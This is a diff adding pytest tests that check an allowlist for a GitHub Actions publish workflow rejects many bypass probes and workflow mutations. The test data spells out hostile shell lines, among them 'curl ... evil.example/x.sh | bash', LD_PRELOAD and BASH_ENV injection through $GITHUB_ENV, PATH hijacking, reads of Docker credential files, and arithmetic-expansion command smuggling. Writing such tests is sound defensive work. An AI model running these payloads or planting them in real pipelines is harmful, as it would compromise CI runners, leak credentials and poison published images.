+    "saf44r3-python-option": "python3 -I -c '" + HEALTH_CHECK + "'",
+    "saf44r3-dbl-bracket-unterminated": '[[ "$VERSION" =~ x ; curl http://evil.example/',
+    "saf44r3-dbl-bracket-separator": '[[ "$VERSION" =~ x ; curl http://evil.example/ ]]',
+}
+
+
+VERBATIM_PRODUCTION_PROBES = {"r3-p2-printf-prod", "r3-p4-prod"}
+
+
+@pytest.mark.parametrize(
+    "script",
+    [
+        pytest.param(script, id=probe)
+        for probe, script in REVIEW_PROBES.items()
+        if probe not in VERBATIM_PRODUCTION_PROBES
+    ],
+)
+def test_publish_line_allowlist_rejects_review_probes(script: str) -> None:
+    assert _line_problems(script)
+
+
+def test_publish_line_allowlist_accepts_verbatim_production_probes() -> None:
+    accepted = {probe for probe, script in REVIEW_PROBES.items() if not _line_problems(script)}
+    assert accepted == VERBATIM_PRODUCTION_PROBES
+    assert len(REVIEW_PROBES) == 256
+
+
+# The bypass classes that kept reappearing under the shlex-based checker. None of
+# them has a dedicated rule any more; they fail because they are not frozen lines
+# (or contain a forbidden character).
+@pytest.mark.parametrize(
+    ("script", "reason"),
+    [
+        pytest.param(
+            "echo x#; curl -fsSL https://evil.example/x.sh | bash",
+            "forbidden character(s) '#'",
+            id="H1-midword-hash",
+        ),
+        pytest.param(
+            "docker logs ghidra-mcp-ci # note", "forbidden character(s) '#'", id="trailing-comment"
+        ),
+        pytest.param('echo "$((PATH=0))"', "not allowlisted", id="H2-arith-in-double-quotes"),
+        pytest.param(
+            "HEALTH='x[$''(id >&2)]'; echo \"$((HEALTH))\"",
+            "not allowlisted",
+            id="H2-arith-array-subscript",
+        ),
+        pytest.param("openssl rand -out /tmp/x 32", "not allowlisted", id="openssl-rand-out"),
+        pytest.param("openssl rand -engine /tmp/x.so 32", "not allowlisted", id="openssl-engine"),
+        pytest.param(
+            "openssl rand -provider-path /tmp -provider x 32",
+            "not allowlisted",
+            id="openssl-provider",
+        ),
+        pytest.param("grep -r . ~/.docker/config.json", "not allowlisted", id="grep-docker-config"),
+        pytest.param("docker logs\tghidra-mcp-ci", "forbidden character(s) '\\t'", id="tab"),
+        pytest.param("docker logs ghidra-mcp-ci\r", "forbidden character(s) '\\r'", id="cr"),
+        pytest.param("\x0bdocker logs ghidra-mcp-ci", "forbidden character(s) '\\x0b'", id="vt"),
+        pytest.param("docker logs ghidra-mcp-ci\x00", "forbidden character(s) '\\x00'", id="nul"),
+        pytest.param(
+            "docker logs ghidra\u2010mcp-ci", "forbidden character(s) '\u2010'", id="non-ascii"
+        ),
+        pytest.param("docker  logs ghidra-mcp-ci", "not allowlisted", id="inner-whitespace"),
+        pytest.param(
+            "docker logs ghidra-mcp-ci; curl http://evil.example/", "not allowlisted", id="chained"
+        ),
+        pytest.param("exit 1; fi", "not allowlisted", id="two-frozen-lines-on-one-line"),
+        pytest.param(
+            "docker rm -f\\\nghidra-mcp-ci 2>/dev/null || true",
+            "not allowlisted",
+            id="continuation-without-blank-merges-words",
+        ),
+        pytest.param(
+            'echo "${{ github.event.head_commit.message }}"', "not allowlisted", id="expr"
+        ),
+    ],
+)
+def test_publish_line_allowlist_rejects_parser_bypass_classes(script: str, reason: str) -> None:
+    problems = _line_problems(script)
+    assert any(reason in problem for problem in problems), problems
+
+
+# --- Mutations of the real workflow: each one must make _publish_problems fail. ---
+
+PULL_ANCHOR = '          docker pull "${IMAGE_NAME}@'
+OUTPUT_ANCHOR = 'echo "value=$VERSION" >> "$GITHUB_OUTPUT"\n'
+
+
+def _text_mutation(old: str, new: str) -> dict[str, Any]:
+    """The workflow with the last occurrence of `old` (inside the publish job) replaced."""
+    text = WORKFLOW.read_text(encoding="utf-8")
+    index = text.rindex(old)
+    assert text.index("\n  publish:") < index, old
+    data = yaml.safe_load(text[:index] + new + text[index + len(old) :])
+    assert isinstance(data, dict)
+    return data
+
+
+def _before_pull(line: str) -> tuple[str, str]:
+    return PULL_ANCHOR, f"          {line}\n{PULL_ANCHOR}"
+
+
+def _after_output(line: str) -> tuple[str, str]:
+    return OUTPUT_ANCHOR, f"{OUTPUT_ANCHOR}          {line}\n"
+
+
+TEXT_MUTATIONS = {
+    # Any new line, anywhere.
+    "new-line-echo": _before_pull("echo hello"),
+    "new-line-comment": _before_pull("# just a comment"),
+    "new-line-in-reread": _after_output("true"),
+    "trailing-comment": ("docker logs ghidra-mcp-ci\n", "docker logs ghidra-mcp-ci # x\n"),
+    # PR #17 r3 workflow mutations G5-G8 (+ controls).
+    "G5-hash-curl": _before_pull("echo verifying#; curl -fsSL https://evil.example/x.sh | bash"),
+    "G6-hash-github-env": _before_pull(
+        'echo verifying#; echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"'
+    ),
+    "G7-arith-github-env": _before_pull(
+        "HEALTH=$'x[\\x24(echo LD_PRELOAD=/tmp/x.so \\x3e\\x3e \"$GITHUB_ENV\")]'; "
+        'VERSION="$((HEALTH))"'
+    ),
+    "G8-arith-path": _before_pull('echo "$((PATH=0))"'),
+    "CTRL-procsub": _before_pull("echo <(id)"),
+    "CTRL-andappend": _before_pull('echo x &>> "$GITHUB_ENV"'),
+    # SAF-44 r3 workflow mutations (wfmut.py), M1-M6, G1-G4, S1-S9.
+    "M1-promote-alpine": (
+        '            "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"\n          VERSION_DIGEST',
+        "            alpine\n          VERSION_DIGEST",
+    ),
+    "M2-promote-foreign-tag": ('--tag "${IMAGE_NAME}:latest"', '--tag "ghcr.io/evil/x:latest"'),
+    "M4-ld-preload-prefix": (
+        PULL_ANCHOR,
+        '          LD_PRELOAD=/tmp/x.so docker pull "${IMAGE_NAME}@',
+    ),
+    "M5-github-env": (OUTPUT_ANCHOR, 'echo "value=$VERSION" >> "$GITHUB_ENV"\n'),
+    "M6-logs-other": ("docker logs ghidra-mcp-ci", "docker logs other"),
+    "G1-andappend-reread": _after_output('echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"'),
+    "G1b-andappend-verify": _before_pull('echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"'),
+    "G1c-rw-docker-config": _before_pull("echo pwned 1<>/home/runner/.docker/config.json"),
+    "G2-printf-v-path": _before_pull("printf -v PATH '%s' \"/tmp/evil:$PATH\""),
+    "G3-procsub": _before_pull("echo <(curl -fsS https://evil.example/x)"),
+    "G4-python-arbitrary": _before_pull(
+        "python3 -c 'import json,sys; import os; os.system(\"id\")'"
+    ),
+    "S1-appendamp": _before_pull('echo x >>& "$GITHUB_ENV"'),
+    "S2-arith-assign": _before_pull("echo $((PATH=5))"),
+    "S3-colon-assign": _before_pull('echo "${BASH_ENV:=/tmp/evil}"'),
+    "S4-dbl-bracket-eq": _before_pull("[[ 1 -eq PATH=1 ]]"),
+    "S5-test-v": _before_pull('[ -v "$HEALTH" ]'),
+    "S6-echo-dbl-bracket": _before_pull("echo [[ ; curl http://evil.example/ ]]"),
+    "S7-python-suffix": ("sys.argv[3]}' \\\n", "sys.argv[3]}; import os' \\\n"),
+    "S8-prompt-expansion": _before_pull('echo "${HEALTH@P}"'),
+    "S9-legacy-arith": _before_pull('echo "$[HEALTH]"'),
+    # Residual shapes from the r3 review.
+    "openssl-out": ("openssl rand -hex 32", "openssl rand -out /tmp/x 32"),
+    "grep-docker-config": _before_pull("grep -r . ~/.docker/config.json"),
+    "tab-in-line": ("docker logs ghidra-mcp-ci", "docker logs\tghidra-mcp-ci"),
+    "non-ascii-in-line": ("docker logs ghidra-mcp-ci", "docker logs ghidra\u2010mcp-ci"),
+    "sleep-changed": ("sleep 2\n", "sleep 0\n"),
+    "expression-changed": ("${{ github.sha }}", "${{ github.event.head_commit.message }}"),
+}
+
+
+@pytest.mark.parametrize(
+    ("old", "new"), [pytest.param(*pair, id=name) for name, pair in TEXT_MUTATIONS.items()]
+)
+def test_publish_allowlist_rejects_workflow_text_mutations(old: str, new: str) -> None:
+    assert _publish_problems(_text_mutation(old, new))
+
+
+def _publish_step(workflow: dict[str, Any], name: str) -> dict[str, Any]:
+    (step,) = [step for step in workflow["jobs"]["publish"]["steps"] if step["name"] == name]
+    return step
+
+
+def _edit_lines(name: str, edit: Any) -> Any:
+    """A mutation that rewrites the logical lines of one bash step."""
+
+    def mutate(workflow: dict[str, Any]) -> None:
+        step = _publish_step(workflow, name)
+        lines = list(_logical_lines(step["run"]))
+        edit(lines)
+        step["run"] = "\n".join(lines) + "\n"
+
+    return mutate
+
+
+def _set(name: str, key: str, value: object) -> Any:
+    return lambda workflow: _publish_step(workflow, name).__setitem__(key, value)
+
+
+def _drop(name: str, key: str) -> Any:
+    return lambda workflow: _publish_step(workflow, name).pop(key)
+
+
+VERIFY = "Verify the candidate digest"
+PROMOTE_STEP = "Promote verified digest"
+REREAD = "Re-read version and test outputs"
+REMOVE = "Remove verification container"
+REFUSE = "Refuse to overwrite a released version"
+PROMOTE_LINE = PUBLISH_RUN_LINES[PROMOTE_STEP][0]
+HEALTH_LINE = PUBLISH_RUN_LINES[VERIFY][7]
+
+
+def _steps(workflow: dict[str, Any]) -> list[dict[str, Any]]:
+    steps = workflow["jobs"]["publish"]["steps"]
+    assert isinstance(steps, list)
+    return steps
+
+
+def _swap_steps(first: str, second: str) -> Any:
+    def mutate(workflow: dict[str, Any]) -> None:
+        steps = _steps(workflow)
+        names = [step["name"] for step in steps]
+        i, j = names.index(first), names.index(second)
+        steps[i], steps[j] = steps[j], steps[i]
+
+    return mutate
+
+
+STRUCTURAL_MUTATIONS = {
+    # Order within a step (passes a per-step set check, fails the sequence).
+    "break-before-health-check": _edit_lines(
+        VERIFY, lambda lines: lines.insert(lines.index(HEALTH_LINE), lines.pop(8))
+    ),
+    "test-before-promote": _edit_lines(PROMOTE_STEP, lambda lines: lines.append(lines.pop(0))),
+    "duplicate-pull": _edit_lines(VERIFY, lambda lines: lines.insert(0, lines[0])),
+    "duplicate-promote": _edit_lines(PROMOTE_STEP, lambda lines: lines.insert(0, lines[0])),
+    "missing-digest-test": _edit_lines(PROMOTE_STEP, lambda lines: lines.pop()),
+    "missing-exit-in-refuse": _edit_lines(REFUSE, lambda lines: lines.remove("exit 1")),
+    "missing-health-check": _edit_lines(VERIFY, lambda lines: lines.remove(HEALTH_LINE)),
+    "emptied-script": _edit_lines(REMOVE, lambda lines: lines.clear()),
+    # Promote injected into another step (cross-step).
+    "promote-in-verify": _edit_lines(VERIFY, lambda lines: lines.insert(3, PROMOTE_LINE)),
+    "promote-in-reread": _edit_lines(REREAD, lambda lines: lines.append(PROMOTE_LINE)),
+    # Steps added, removed, renamed, duplicated, reordered.
+    "new-bash-step": lambda workflow: _steps(workflow).insert(
+        3, {"name": "Debug", "shell": "bash", "run": "docker logs ghidra-mcp-ci\n"}
+    ),
+    "removed-bash-step": lambda workflow: _steps(workflow).pop(),
+    "renamed-bash-step": _set(REMOVE, "name", "Remove the verification container"),
+    "duplicated-bash-step": lambda workflow: _steps(workflow).append(
+        dict(_publish_step(workflow, REMOVE))
+    ),
+    "promote-before-verify": _swap_steps(VERIFY, PROMOTE_STEP),
+    "remove-before-verify": _swap_steps(VERIFY, REMOVE),
+    "verify-replaced-by-pinned-action": lambda workflow: _steps(workflow).__setitem__(
+        PUBLISH_STEP_NAMES.index(VERIFY),
+        {"name": VERIFY, "uses": sorted(ALLOWED_PUBLISH_ACTIONS)[0]},
+    ),
+    # Characters str.strip() would remove but bash does not treat as blanks.
+    "leading-vertical-tab": _edit_lines(
+        REMOVE, lambda lines: lines.__setitem__(0, "\x0b" + lines[0])
+    ),
+    "leading-file-separator": _edit_lines(
+        REMOVE, lambda lines: lines.__setitem__(0, "\x1c" + lines[0])
+    ),
+    "trailing-nbsp": _edit_lines(REMOVE, lambda lines: lines.__setitem__(0, lines[0] + "\xa0")),
+    "run-is-a-list": _set(REMOVE, "run", ["docker rm -f ghidra-mcp-ci 2>/dev/null || true"]),
+    # shell / env / if / id / timeout-minutes frozen, including "absent".
+    "shell-sh": _set(VERIFY, "shell", "sh"),
+    "shell-bash-x": _set(VERIFY, "shell", "bash -x {0}"),
+    "shell-removed": _drop(VERIFY, "shell"),
+    "shell-added-to-remove": _set(REMOVE, "shell", "bash"),
+    "bash-env-on-verify": _set(VERIFY, "env", {"BASH_ENV": "/tmp/evil"}),
+    "env-on-remove": _set(REMOVE, "env", {"BASH_ENV": "/tmp/evil"}),
+    "empty-env-on-promote": _set(PROMOTE_STEP, "env", {}),
+    "extra-env-on-reread": lambda workflow: _publish_step(workflow, REREAD)["env"].update(
+        BASH_ENV="/tmp/evil"
+    ),
+    "changed-env-on-reread": lambda workflow: _publish_step(workflow, REREAD)["env"].update(
+        TESTED_VERSION="${{ github.event.head_commit.message }}"
+    ),
+    "if-always-on-promote": _set(PROMOTE_STEP, "if", "always()"),
+    "if-removed-from-remove": _drop(REMOVE, "if"),
+    "if-changed-on-remove": _set(REMOVE, "if", "success()"),
+    "id-changed-on-reread": _set(REREAD, "id", "v"),
+    "id-added-to-verify": _set(VERIFY, "id", "verify"),
+    "timeout-added-to-verify": _set(VERIFY, "timeout-minutes", 5),
+    "working-directory": _set(VERIFY, "working-directory", "/tmp"),
+    "continue-on-error": _set(VERIFY, "continue-on-error", True),
+    "with-on-run-step": _set(VERIFY, "with", {"x": "y"}),
+    # The version check: shell fields and the pinned script hash.
+    "version-check-timeout-changed": _set(VERSION_CHECK, "timeout-minutes", 6),
+    "version-check-timeout-as-string": _set(VERSION_CHECK, "timeout-minutes", "5"),
+    "version-check-timeout-as-float": _set(VERSION_CHECK, "timeout-minutes", 5.0),
+    "version-check-shell-bash": _set(VERSION_CHECK, "shell", "bash"),
+    "version-check-extra-env": lambda workflow: _publish_step(workflow, VERSION_CHECK)[
+        "env"
+    ].update(PYTHONSTARTUP="/tmp/evil.py"),
+    "version-check-script-edited": lambda workflow: _publish_step(
+        workflow, VERSION_CHECK
+    ).__setitem__("run", _publish_step(workflow, VERSION_CHECK)["run"] + "import os\n"),
+    "version-check-script-whitespace": lambda workflow: _publish_step(
+        workflow, VERSION_CHECK
+    ).__setitem__("run", _publish_step(workflow, VERSION_CHECK)["run"] + "\n"),
+    "version-check-id-added": _set(VERSION_CHECK, "id", "check"),
+    # Workflow- and job-level settings that change how every bash step runs.
+    "workflow-defaults": lambda workflow: workflow.update(defaults={"run": {"shell": "sh {0}"}}),
+    "job-defaults": lambda workflow: workflow["jobs"]["publish"].update(
+        defaults={"run": {"shell": "sh {0}"}}
+    ),
+    "job-bash-env": lambda workflow: workflow["jobs"]["publish"].update(
+        env={"BASH_ENV": "/tmp/evil"}
+    ),
+    "workflow-bash-env": lambda workflow: workflow["env"].update(BASH_ENV="/tmp/evil"),
+    "workflow-image-name": lambda workflow: workflow["env"].update(IMAGE_NAME="ghcr.io/evil/x"),
+    "job-container": lambda workflow: workflow["jobs"]["publish"].update(container="alpine"),
+}
+
+
+@pytest.mark.parametrize(
+    "mutate", [pytest.param(mutate, id=name) for name, mutate in STRUCTURAL_MUTATIONS.items()]
+)
+def test_publish_allowlist_rejects_structural_mutations(mutate: Any) -> None:
+    workflow = copy.deepcopy(_workflow())
+    assert _publish_problems(workflow) == []
+    mutate(workflow)
+    assert _publish_problems(workflow)
+
+
+def test_publish_allowlist_sequence_check_catches_what_a_set_check_misses() -> None:
+    # Moving `break` above the health check keeps every line in the step's set
+    # but skips verification; only the ordered comparison rejects it.
+    workflow = copy.deepcopy(_workflow())
+    STRUCTURAL_MUTATIONS["break-before-health-check"](workflow)
+    run = _publish_step(workflow, VERIFY)["run"]
+    assert set(_logical_lines(run)) == set(PUBLISH_RUN_LINES[VERIFY])
+    assert _line_problems(run) == []
+    assert _publish_problems(workflow) == [
+        f"{VERIFY}: lines differ from the frozen sequence (order, duplicate or missing)"
+    ]
 
 
 def test_publish_steps_cannot_be_forced_past_a_failure() -> None:
@@ -1225,3 +1476,19 @@ def test_release_jobs_have_timeouts() -> None:
     assert set(jobs) == {"test", "publish"}
     assert all(10 <= job["timeout-minutes"] <= 60 for job in jobs.values())
     assert 1 <= _step("publish", VERSION_CHECK).raw["timeout-minutes"] <= 10
+
+
+def test_publish_allowlist_reports_a_line_moved_to_another_step() -> None:
+    # Promoting from inside the Verify step, before the health check, is reported
+    # both as a line foreign to that step and as a broken sequence.
+    workflow = copy.deepcopy(_workflow())
+    STRUCTURAL_MUTATIONS["promote-in-verify"](workflow)
+    assert _publish_problems(workflow) == [
+        f"{VERIFY}: line 3 is not allowlisted for this step: {PROMOTE_LINE}",
+        f"{VERIFY}: lines differ from the frozen sequence (order, duplicate or missing)",
+    ]
+
+
+def test_publish_line_allowlist_joins_only_blank_backslash_continuations() -> None:
+    assert _line_problems("docker rm -f \\\n    ghidra-mcp-ci 2>/dev/null || true\n\n") == []
+    assert _line_problems("docker rm -f\\\n    ghidra-mcp-ci 2>/dev/null || true")
